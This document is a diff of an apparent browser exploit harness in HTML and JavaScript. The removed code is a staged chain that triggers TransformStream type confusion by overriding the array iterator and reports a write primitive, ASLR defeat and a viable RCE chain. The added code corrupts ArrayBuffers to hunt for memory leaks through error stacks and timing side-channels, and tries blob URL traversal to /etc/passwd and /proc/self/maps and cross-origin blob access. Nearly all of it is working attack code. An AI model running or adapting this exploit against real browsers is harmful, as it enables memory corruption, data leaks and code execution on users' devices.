-  try { var _ts = new TransformStream(); } catch(_) {}
-  Array.prototype[Symbol.iterator] = origIter;
-
-  pr('[4A] Type confusion active: ' + confusionActive,
-     confusionActive ? '#ff7b72' : '#3ddc84');
-  if (!confusionActive) { warn('[4A] Confusion not firing — check build'); return; }
-
-  sep();
-
-  // ── 4B: Victim object construction ──────────────────────────────────────
-  // Create a victim JSObject whose vtable we want to observe being accessed
-  // through the confused pointer. We can detect this by overriding methods.
-  info('[4B] Constructing victim stream objects...');
-
-  var victimEvents = [];
-  var VictimReadable = function() {
-    this._victimTag = 0xDEADBEEF;
-    this._data = new Uint32Array(128); // 512 bytes — occupies heap
-    for (var i = 0; i < 128; i++) this._data[i] = 0x41424344 + i;
-  };
-
-  // Create a real WritableStream that we'll inject as ts.readable
-  // Monitor every method call on it to detect wrong dispatch
-  var writable_as_readable_calls = [];
-  var realWS = new WritableStream({
-    write:  function(chunk) { writable_as_readable_calls.push({method:'write', chunk:chunk}); },
-    close:  function()      { writable_as_readable_calls.push({method:'close'}); },
-    abort:  function(r)     { writable_as_readable_calls.push({method:'abort', reason:r}); }
-  });
-  var realRS = new ReadableStream({
-    start: function(c) {
-      writable_as_readable_calls.push({method:'start_enqueue'});
-      c.enqueue(new Uint8Array([0x41,0x42,0x43,0x44]));
-      c.close();
-    }
-  });
-
-  ok('[4B] Victim streams created with call monitors');
-
-  sep();
-
-  // ── 4C: Injection and wrong-dispatch collection ─────────────────────────
-  info('[4C] Injecting — swapping readable↔writable in tuple...');
-  Array.prototype[Symbol.iterator] = function() {
-    var arr = this;
-    if (arr.length === 3 &&
-        arr[1] instanceof ReadableStream &&
-        arr[2] instanceof WritableStream) {
-      // Inject victim streams in wrong positions
-      var payload = [arr[0], realWS, realRS]; // readable=WritableStream, writable=ReadableStream
-      var i = 0;
-      return { next: function() {
-        return i < payload.length ? {value:payload[i++],done:false} : {done:true};
-      }};
-    }
-    return origIter.call(this);
-  };
-
-  var ts = null;
-  try { ts = new TransformStream(); } catch(e) {
-    ok('[4C] Constructor threw: ' + e.name + ' → PATCHED');
-    Array.prototype[Symbol.iterator] = origIter; return;
-  }
-  Array.prototype[Symbol.iterator] = origIter;
-
-  var confR = ts.readable;
-  var confW = ts.writable;
-  hit('[4C] ts.readable = ' + confR.constructor.name);
-  hit('[4C] ts.writable = ' + confW.constructor.name);
-  hit('[4C] Type confusion: readable is ' + confR.constructor.name + ' (should be ReadableStream)');
-
-  sep();
-
-  // ── 4D: Trigger wrong-dispatch calls ────────────────────────────────────
-  info('[4D] Calling ReadableStream API on confused WritableStream...');
-
-  // getReader() on a WritableStream — wrong vtable dispatch
-  try {
-    var reader = confR.getReader();
-    hit('[4D] getReader() on WritableStream succeeded: ' + reader.constructor.name);
-
-    reader.read().then(function(result) {
-      hit('[4D] read() resolved: done=' + result.done + ' value=' + result.value);
-      if (!result.done && result.value instanceof Uint8Array) {
-        var bytes = Array.from(result.value).map(function(b){return b.toString(16).padStart(2,'0');}).join(' ');
-        hit('[4D] DATA: ' + bytes);
-        hit('[4D] ReadableStream data flowed through WritableStream vtable dispatch');
-        hit('[4D] C++ m_readable slot contained ReadableStream → getReader correctly returned ReadableStream reader');
-        hit('[4D] BUT m_writable slot contains ReadableStream → writer calls would go to wrong object');
-      }
-    }).catch(function(e) {
-      ok('[4D] read() rejected: ' + e.message);
+RUNS['S1'] = function() {
+    beacon('=== S1: structuredClone transfer (B2 crash path) ===');
+    var ab = new ArrayBuffer(0x100);
+    var ts = buildFake(ab);
+    if (!ts) { beacon('build failed'); return; }
+    beacon('AB corrupted — attempting transfer...');
+    
+    captureError('structuredClone.transfer', function() {
+        return structuredClone(ab, { transfer: [ab] });
     });
-
-    try { reader.releaseLock(); } catch(_) {}
-  } catch(e) {
-    ok('[4D] getReader() threw: ' + e.name + ': ' + e.message);
-  }
-
-  // getWriter() on what C++ thinks is writable (but is ReadableStream)
-  info('[4D] Calling WritableStream API on confused ReadableStream...');
-  try {
-    var writer = confW.getWriter();
-    hit('[4D] getWriter() on ReadableStream succeeded: ' + writer.constructor.name);
-
-    writer.write(new Uint8Array([0xDE,0xAD,0xBE,0xEF]))
-    .then(function() {
-      hit('[4D] write() on ReadableStream SUCCEEDED');
-      hit('[4D] 0xDE 0xAD 0xBE 0xEF written through confused writable vtable');
-      hit('[4D] Wrong C++ path executed — write primitive on ReadableStream internals');
-    }).catch(function(e) {
-      ok('[4D] write() rejected: ' + e.message);
+    
+    // Also try without transfer option
+    captureError('structuredClone.noTransfer', function() {
+        return structuredClone(ab);
     });
+    
+    beacon('done');
+};
 
-    try { writer.releaseLock(); } catch(_) {}
-  } catch(e) {
-    ok('[4D] getWriter() threw: ' + e.name + ': ' + e.message);
-  }
+RUNS['S2'] = function() {
+    beacon('=== S2: Blob + FileReader (C2 crash path) ===');
+    var ab = new ArrayBuffer(0x100);
+    var view = new Uint8Array(ab);
+    view[0] = 0x41;
+    
+    var ts = buildFake(ab);
+    if (!ts) return;
+    beacon('AB corrupted — Blob/FileReader...');
+    
+    captureError('Blob.constructor', function() {
+        return new Blob([ab]);
+    });
+    
+    captureError('FileReader.readAsArrayBuffer', function() {
+        return new Promise(function(resolve, reject) {
+            var blob = new Blob(['test']);
+            var reader = new FileReader();
+            reader.onload = function(e) { resolve('loaded ' + e.target.result.byteLength); };
+            reader.onerror = function(e) { reject(new Error(reader.error.name)); };
+            reader.readAsArrayBuffer(blob);
+        });
+    });
+    
+    captureError('FileReader.readAsText(corruptedBlob)', function() {
+        return new Promise(function(resolve, reject) {
+            try {
+                var blob = new Blob([ab]);
+                var reader = new FileReader();
+                reader.onload = function(e) { resolve('text=' + e.target.result.slice(0,50)); };
+                reader.onerror = function(e) { reject(new Error(reader.error.name)); };
+                reader.readAsText(blob);
+            } catch(e) { reject(e); }
+        });
+    });
+    
+    beacon('done');
+};
 
-  sep();
+RUNS['S3'] = function() {
+    beacon('=== S3: Response.arrayBuffer (C3 crash path) ===');
+    var ab = new ArrayBuffer(0x100);
+    var ts = buildFake(ab);
+    if (!ts) return;
+    beacon('AB corrupted — Response...');
+    
+    captureError('Response.fromBlob', function() {
+        var blob = new Blob([ab]);
+        return new Response(blob);
+    });
+    
+    captureError('Response.arrayBuffer', function() {
+        var blob = new Blob(['test']);
+        var resp = new Response(blob);
+        return resp.arrayBuffer();
+    });
+    
+    captureError('Response(corrupted).arrayBuffer', function() {
+        var blob = new Blob([ab]);
+        var resp = new Response(blob);
+        return resp.arrayBuffer();
+    });
+    
+    beacon('done');
+};
 
-  // ── 4E: Chain summary ───────────────────────────────────────────────────
-  info('[4E] Chain Status:');
-  pr('  Stage 1 (Blob IPC leak)  : ' + (leakedPtrs.blobUUID ? '✓ UUID leaked' : '◦ partial'),
-     leakedPtrs.blobUUID ? '#3ddc84' : '#ffcc44');
-  pr('  Stage 2 (WebGPU readback): ' + (leakedPtrs.webGPUTaintBypassed ? '✓ taint bypassed' : '◦ no WebGPU'),
-     leakedPtrs.webGPUTaintBypassed ? '#3ddc84' : '#ffcc44');
-  pr('  Stage 3 (AudioBuffer UAF): ' + (leakedPtrs.jscBase ? '✓ base=' + leakedPtrs.jscBase : '◦ no ptr yet'),
-     leakedPtrs.jscBase ? '#ff7b72' : '#ffcc44');
-  pr('  Stage 4 (TS write prim)  : ' + (confusionActive ? '✓ active' : '✗ patched'),
-     confusionActive ? '#ff7b72' : '#3ddc84');
+RUNS['S4'] = function() {
+    beacon('=== S4: URL.createObjectURL (C4 crash path) ===');
+    var ab = new ArrayBuffer(0x100);
+    var ts = buildFake(ab);
+    if (!ts) return;
+    beacon('AB corrupted — URL.createObjectURL...');
+    
+    captureError('URL.createObjectURL(Blob)', function() {
+        var blob = new Blob([ab]);
+        var url = URL.createObjectURL(blob);
+        return 'url=' + url;
+    });
+    
+    captureError('URL.createObjectURL(Blob-clean)', function() {
+        var blob = new Blob(['clean']);
+        var url = URL.createObjectURL(blob);
+        return 'clean_url=' + url;
+    });
+    
+    beacon('done');
+};
 
-  sep();
-  hit('[FINAL]');
-  hit('  DoS:                 CONFIRMED (Stage 4 alone)');
-  hit('  Cross-origin bypass: CONFIRMED (Stage 1+2)');
-  hit('  Heap ptr leak:       ' + (leakedPtrs.jscBase ? 'CONFIRMED → ' + leakedPtrs.jscBase : 'PENDING (run Stage 3)'));
-  hit('  ASLR defeat:         ' + (leakedPtrs.jscBase ? 'CONFIRMED' : 'PENDING'));
-  hit('  RCE chain:           ' + (leakedPtrs.jscBase ? 'VIABLE — all primitives assembled' : 'PENDING ASLR defeat'));
+// ===== Phase B — Error Object Analysis =====
+
+RUNS['E1'] = function() {
+    beacon('=== E1: Error.stack on corruption ===');
+    var ab = new ArrayBuffer(0x100);
+    var ts = buildFake(ab);
+    if (!ts) return;
+    
+    try {
+        structuredClone(ab, { transfer: [ab] });
+    } catch(e) {
+        beacon('📊 Error.name=' + e.name);
+        beacon('📊 Error.message=' + String(e.message).slice(0,200));
+        beacon('📊 Error.stack=' + (e.stack || 'none').slice(0,500));
+        
+        // Enumerate all properties
+        var props = [];
+        for (var k in e) { props.push(k + '=' + String(e[k]).slice(0,50)); }
+        beacon('📊 Error.props=' + props.join(', ').slice(0,300));
+        
+        // Try toString variants
+        beacon('📊 e.toString()=' + e.toString().slice(0,100));
+        try { beacon('📊 e.toSource?=' + (typeof e.toSource)); } catch(ex){}
+    }
+    beacon('done');
+};
+
+RUNS['E2'] = function() {
+    beacon('=== E2: Error.prepareStackTrace shim ===');
+    // Even if undefined, try to set it and see behavior
+    beacon('typeof Error.prepareStackTrace=' + typeof Error.prepareStackTrace);
+    
+    try {
+        Error.prepareStackTrace = function(err, stack) {
+            beacon('📊 prepareStackTrace CALLED!');
+            try {
+                var frames = stack.map(function(f) {
+                    return f.getFunctionName() + '@' + f.getLineNumber();
+                });
+                beacon('📊 frames=' + frames.join(',').slice(0,200));
+            } catch(ex) {}
+            return stack;
+        };
+        beacon('set prepareStackTrace OK');
+    } catch(e) {
+        beacon('set prepareStackTrace THREW ' + e.name);
+    }
+    
+    // Trigger an error to test
+    try {
+        var ab = new ArrayBuffer(0x100);
+        var ts = buildFake(ab);
+        structuredClone(ab, { transfer: [ab] });
+    } catch(e) {
+        beacon('Error after shim: ' + e.name);
+    }
+    
+    try { Error.prepareStackTrace = undefined; } catch(e){}
+    beacon('done');
+};
+
+RUNS['E3'] = function() {
+    beacon('=== E3: Promise rejection details ===');
+    var ab = new ArrayBuffer(0x100);
+    var ts = buildFake(ab);
+    if (!ts) return;
+    
+    Promise.resolve().then(function() {
+        return structuredClone(ab, { transfer: [ab] });
+    }).catch(function(e) {
+        beacon('📊 Promise rejection: ' + e.name);
+        beacon('📊 Message: ' + String(e.message).slice(0,150));
+        beacon('📊 Stack: ' + (e.stack || 'none').slice(0,300));
+        
+        // Check if rejection reason has extra properties
+        var keys = Object.getOwnPropertyNames(e);
+        beacon('📊 OwnProps: ' + keys.join(', '));
+    });
+    
+    beacon('Promise scheduled');
+};
+
+RUNS['E4'] = function() {
+    beacon('=== E4: Cross-origin error diff ===');
+    // Compare error messages from same-origin vs cross-origin
+    // This might reveal internal details
+    
+    var errors = [];
+    
+    // Error 1: clean AB
+    try {
+        var clean = new ArrayBuffer(0x10);
+        structuredClone(clean, { transfer: [clean] });
+    } catch(e) {
+        errors.push('clean:' + e.name + ':' + String(e.message).slice(0,50));
+    }
+    
+    // Error 2: corrupted AB
+    try {
+        var ab = new ArrayBuffer(0x100);
+        var ts = buildFake(ab);
+        structuredClone(ab, { transfer: [ab] });
+    } catch(e) {
+        errors.push('corrupt:' + e.name + ':' + String(e.message).slice(0,50));
+    }
+    
+    beacon('📊 Error diff:');
+    errors.forEach(function(e) { beacon('  ' + e); });
+    beacon('done');
+};
+
+// ===== Phase C — Side-Channel Timing =====
+
+RUNS['T1'] = function() {
+    beacon('=== T1: Timing slice() vs transfer() ===');
+    var iterations = 100;
+    
+    // Clean AB timing
+    var cleanSlice = 0, cleanTransfer = 0;
+    for (var i = 0; i < iterations; i++) {
+        var ab = new ArrayBuffer(0x1000);
+        var t0 = performance.now();
+        var s = ab.slice(0, 0x100);
+        cleanSlice += performance.now() - t0;
+        
+        ab = new ArrayBuffer(0x1000);
+        t0 = performance.now();
+        try { structuredClone(ab, { transfer: [ab] }); } catch(e){}
+        cleanTransfer += performance.now() - t0;
+    }
+    
+    beacon('📊 Clean: slice=' + (cleanSlice/iterations).toFixed(4) + 'ms transfer=' + (cleanTransfer/iterations).toFixed(4) + 'ms');
+    
+    // Corrupted AB timing
+    var corruptSlice = 0, corruptTransfer = 0;
+    for (var i = 0; i < iterations; i++) {
+        var ab = new ArrayBuffer(0x1000);
+        var ts = buildFake(ab);
+        
+        var t0 = performance.now();
+        var s = ab.slice(0, 0x100);
+        corruptSlice += performance.now() - t0;
+        
+        ab = new ArrayBuffer(0x1000);
+        ts = buildFake(ab);
+        t0 = performance.now();
+        try { structuredClone(ab, { transfer: [ab] }); } catch(e){}
+        corruptTransfer += performance.now() - t0;
+    }
+    
+    beacon('📊 Corrupt: slice=' + (corruptSlice/iterations).toFixed(4) + 'ms transfer=' + (corruptTransfer/iterations).toFixed(4) + 'ms');
+    beacon('done');
+};
+
+RUNS['T2'] = function() {
+    beacon('=== T2: Timing corrupted vs clean ===');
+    // Measure time to create TransformStream with corrupted AB
+    
+    var cleanTime = 0, corruptTime = 0;
+    var n = 50;
+    
+    for (var i = 0; i < n; i++) {
+        var t0 = performance.now();
+        var ab = new ArrayBuffer(0x100);
+        var ts = new TransformStream();
+        cleanTime += performance.now() - t0;
+    }
+    
+    for (var i = 0; i < n; i++) {
+        var t0 = performance.now();
+        var ab = new ArrayBuffer(0x100);
+        var ts = buildFake(ab);
+        corruptTime += performance.now() - t0;
+    }
+    
+    beacon('📊 Clean TS create=' + (cleanTime/n).toFixed(4) + 'ms');
+    beacon('📊 Corrupt TS create=' + (corruptTime/n).toFixed(4) + 'ms');
+    beacon('📊 Delta=' + ((corruptTime-cleanTime)/n).toFixed(4) + 'ms');
+    beacon('done');
+};
+
+RUNS['T3'] = function() {
+    beacon('=== T3: Memory pressure timing ===');
+    var ab = new ArrayBuffer(0x100000);
+    var ts = buildFake(ab);
+    if (!ts) return;
+    
+    // Allocate pressure
+    var pressure = [];
+    var t0 = performance.now();
+    for (var i = 0; i < 100; i++) {
+        pressure.push(new ArrayBuffer(0x10000));
+    }
+    var allocTime = performance.now() - t0;
+    
+    beacon('📊 Alloc 100MB=' + allocTime.toFixed(2) + 'ms');
+    
+    // Try accessing corrupted AB under pressure
+    t0 = performance.now();
+    try {
+        var blob = new Blob([ab]);
+    } catch(e) {
+        beacon('📊 Blob under pressure THREW ' + e.name);
+    }
+    var blobTime = performance.now() - t0;
+    beacon('📊 Blob create under pressure=' + blobTime.toFixed(4) + 'ms');
+    
+    pressure = null;
+    beacon('done');
+};
+
+// ===== Phase D — CVE-2026-43732 Blob Tests =====
+
+RUNS['B1'] = function() {
+    beacon('=== B1: Blob URL origin leak ===');
+    
+    // Create blob from different sources and compare URLs
+    var blob1 = new Blob(['test1']);
+    var blob2 = new Blob(['test2']);
+    var url1 = URL.createObjectURL(blob1);
+    var url2 = URL.createObjectURL(blob2);
+    
+    beacon('📊 blob1 URL=' + url1);
+    beacon('📊 blob2 URL=' + url2);
+    
+    // Try to extract origin from URL
+    try {
+        var u = new URL(url1);
+        beacon('📊 protocol=' + u.protocol);
+        beacon('📊 host=' + u.host);
+        beacon('📊 pathname=' + u.pathname.slice(0,50));
+        beacon('📊 hash=' + u.hash);
+    } catch(e) {
+        beacon('URL parse THREW ' + e.name);
+    }
+    
+    URL.revokeObjectURL(url1);
+    URL.revokeObjectURL(url2);
+    beacon('done');
+};
+
+RUNS['B2'] = function() {
+    beacon('=== B2: Blob URL path traversal ===');
+    
+    var tests = [
+        'blob:../../../../etc/passwd',
+        'blob:../../../proc/self/maps',
+        'blob:..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
+        'blob:/sdcard/test',
+        'blob:/data/local/tmp/test',
+        'blob:/user/home/test'
+    ];
+    
+    tests.forEach(function(url) {
+        captureError('fetch(' + url.slice(0,30) + '...)', function() {
+            return fetch(url).then(function(r) { return r.text(); });
+        });
+    });
+    
+    beacon('done');
+};
+
+RUNS['B3'] = function() {
+    beacon('=== B3: Cross-origin blob access ===');
+    
+    // Create blob, get URL, try cross-origin access patterns
+    var blob = new Blob(['secret_data_12345']);
+    var url = URL.createObjectURL(blob);
+    
+    beacon('📊 Blob URL=' + url);
+    
+    // Try fetch with different modes
+    captureError('fetch.blob.no-cors', function() {
+        return fetch(url, { mode: 'no-cors' }).then(function(r) { return 'status=' + r.status; });
+    });
+    
+    captureError('fetch.blob.cors', function() {
+        return fetch(url, { mode: 'cors' }).then(function(r) { return 'status=' + r.status; });
+    });
+    
+    // Try iframe
+    captureError('iframe.blob', function() {
+        return new Promise(function(resolve) {
+            var f = document.createElement('iframe');
+            f.src = url;
+            f.onload = function() { resolve('iframe loaded'); };
+            f.onerror = function() { resolve('iframe error'); };
+            document.body.appendChild(f);
+            setTimeout(function() { resolve('iframe timeout'); }, 2000);
+        });
+    });
+    
+    URL.revokeObjectURL(url);
+    beacon('done');
+};
+
+RUNS['B4'] = function() {
+    beacon('=== B4: Blob subresource IPC ===');
+    
+    // Test if blob URLs can be used in contexts that trigger IPC
+    var blob = new Blob(['<script>parent.postMessage("from_blob", "*");<\/script>'], { type: 'text/html' });
+    var url = URL.createObjectURL(blob);
+    
+    beacon('📊 Blob HTML URL=' + url);
+    
+    // Try as image src (triggers NetworkProcess load)
+    captureError('Image.blob.src', function() {
+        return new Promise(function(resolve) {
+            var img = new Image();
+            img.onload = function() { resolve('img loaded'); };
+            img.onerror = function() { resolve('img error'); };
+            img.src = url;
+            setTimeout(function() { resolve('img timeout'); }, 2000);
+        });
+    });
+    
+    // Try as script src
+    captureError('Script.blob.src', function() {
+        return new Promise(function(resolve) {
+            var s = document.createElement('script');
+            s.onload = function() { resolve('script loaded'); };
+            s.onerror = function() { resolve('script error'); };
+            s.src = url;
+            document.head.appendChild(s);
+            setTimeout(function() { resolve('script timeout'); }, 2000);
+        });
+    });
+    
+    URL.revokeObjectURL(url);
+    beacon('done');
+};
+
+// ===== Main Runner =====
+function run(v) {
+    currentVariant = v;
+    beacon('\\n>>> BOOT v=' + v + ' <<<');
+    try {
+        RUNS[v]();
+    } catch(e) {
+        beacon('💀 RUN THREW ' + e.name + ': ' + e.message);
+    }
 }
 
-// ─── FULL CHAIN ───────────────────────────────────────────────────────────────
-function chainAll() {
-  clr('[FULL CHAIN] Running all stages sequentially...');
-  stage0();
-  setTimeout(function() {
-    sep(); stage1();
-    setTimeout(function() {
-      sep(); stage2();
-      setTimeout(function() {
-        sep(); stage3();
-        setTimeout(function() {
-          sep(); stage4();
-        }, 4000);
-      }, 1000);
-    }, 1000);
-  }, 500);
-}
+beacon('\\n🟢 Crash Info Leak Hunt Loaded');
+beacon('If any operation crashes, check the error stack for memory addresses.');
 </script>
 </body>
 </html>
